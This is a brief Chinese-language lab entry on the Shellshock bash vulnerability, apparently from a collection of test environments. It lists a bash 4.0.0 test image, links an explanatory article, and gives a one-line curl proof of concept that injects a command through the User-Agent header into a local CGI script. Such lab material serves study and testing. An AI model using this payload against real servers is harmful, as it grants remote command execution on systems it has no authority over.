## shellshock 漏洞

测试镜像

* src/bash/4.0.0/

参考链接

* [shellshock原理介绍](https://introspelliam.github.io/2017/09/09/shellshock%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D/)

Poc

```
curl -k -A "() { :; }; echo; /bin/ls -lh; " 127.0.0.1/cgi-bin/test.sh
```

